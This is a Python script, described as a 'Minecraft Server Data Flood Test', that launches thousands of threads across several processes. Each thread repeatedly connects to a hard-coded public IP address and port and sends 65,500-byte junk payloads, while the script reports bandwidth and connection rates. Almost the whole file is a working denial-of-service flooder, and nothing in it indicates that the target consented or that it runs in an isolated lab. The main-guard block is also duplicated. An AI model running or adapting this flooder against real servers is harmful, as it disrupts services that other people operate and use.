"""
Minecraft Server Data Flood Test - Multi-process version
"""
import socket, time, threading, sys, multiprocessing
from colorama import init, Fore
init(autoreset=True)

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_IP = "5.133.100.33"
TARGET_PORT = 25600
THREAD_COUNT = 10000
TEST_DURATION = 30
PAYLOAD_SIZE = 65500
# ─── WORKER ───────────────────────────────────────────────────────────────────
PAYLOAD = b'x' * PAYLOAD_SIZE

def flood_worker(stop_event, stats):
    """Each thread repeatedly connects, sends max payload, closes"""
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(3.0)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(PAYLOAD)
            stats['bytes'] = stats.get('bytes', 0) + len(PAYLOAD)
            stats['connections'] = stats.get('connections', 0) + 1
            s.close()
        except Exception:
            stats['errors'] = stats.get('errors', 0) + 1

# ─── PROCESS WORKER ───────────────────────────────────────────────────────────
def process_worker(thread_count, stop_event, stats):
    """Each process runs its own threads"""
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=flood_worker, args=(stop_event, stats), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    print("[FLOOD] Minecraft Server Data Flood Test")
    print(f"[TARGET] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[THREADS] Threads: {THREAD_COUNT}")
    print(f"[DURATION] Duration: {TEST_DURATION} seconds")
    print(f"[PAYLOAD] Payload size: {PAYLOAD_SIZE} bytes per connection\n")
    
    # Initial connectivity check
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET_IP, TARGET_PORT))
        s.close()
        print("[OK] Initial connection successful\n")
    except Exception as e:
        print(f"[ERROR] Cannot connect: {e}")
        return
    
    cpu = multiprocessing.cpu_count()
    num_procs = min(cpu, THREAD_COUNT // 50 + 1, 16)
    tpp = max(1, THREAD_COUNT // num_procs)
    
    print(f"[CPU] Detected {cpu} cores, using {num_procs} processes ({tpp} threads each)\n")
    
    manager = multiprocessing.Manager()
    stats = manager.dict()
    stats['bytes'] = 0
    stats['connections'] = 0
    stats['errors'] = 0
    
    stop_event = multiprocessing.Event()
    procs = []
    
    print("[START] Flood starting...")
    for _ in range(num_procs):
        p = multiprocessing.Process(target=process_worker, args=(tpp, stop_event, stats), daemon=True)
        p.start()
        procs.append(p)
    
    start_time = time.time()
    try:
        while time.time() - start_time < TEST_DURATION:
            elapsed = time.time() - start_time
            bytes_sent = stats.get('bytes', 0)
            connections = stats.get('connections', 0)
            errors = stats.get('errors', 0)
            rate_bps = bytes_sent / max(elapsed, 0.1)
            rate_mbps = rate_bps * 8 / 1_000_000
            conn_per_sec = connections / max(elapsed, 0.1)
            error_rate = (errors / max(connections + errors, 1)) * 100
            
            print(f"\r[TIME] {elapsed:.0f}s | "
                  f"[DATA] {bytes_sent / 1_000_000:.2f} MB | "
                  f"[RATE] {rate_mbps:.2f} Mbps | "
                  f"[CONN] {connections} ({conn_per_sec:.0f}/s) | "
                  f"[ERRORS] {errors} ({error_rate:.1f}%) | "
                  f"[PROCS] {sum(1 for p in procs if p.is_alive())}/{num_procs}", 
                  end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[STOP] Stopping...")
    
    stop_event.set()
    print("\n[WAIT] Waiting for processes...")
    for p in procs:
        p.join(timeout=3)
    
    bytes_sent = stats.get('bytes', 0)
    connections = stats.get('connections', 0)
    errors = stats.get('errors', 0)
    elapsed = time.time() - start_time
    rate_bps = bytes_sent / max(elapsed, 0.1)
    rate_mbps = rate_bps * 8 / 1_000_000
    conn_per_sec = connections / max(elapsed, 0.1)
    error_rate = (errors / max(connections + errors, 1)) * 100
    
    print(f"\n[RESULT] TEST COMPLETE")
    print(f"[TIME] {elapsed:.2f}s")
    print(f"[DATA] {bytes_sent / 1_000_000:.2f} MB")
    print(f"[RATE] {rate_mbps:.2f} Mbps ({rate_bps:.0f} B/s)")
    print(f"[CONN] {connections:,} ({conn_per_sec:.0f}/s)")
    print(f"[ERRORS] {errors:,} ({error_rate:.1f}%)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[STOP] Interrupted")
    except Exception as e:
        print(f"[FATAL] {e}")


if __name__ == "__main__":
    main()
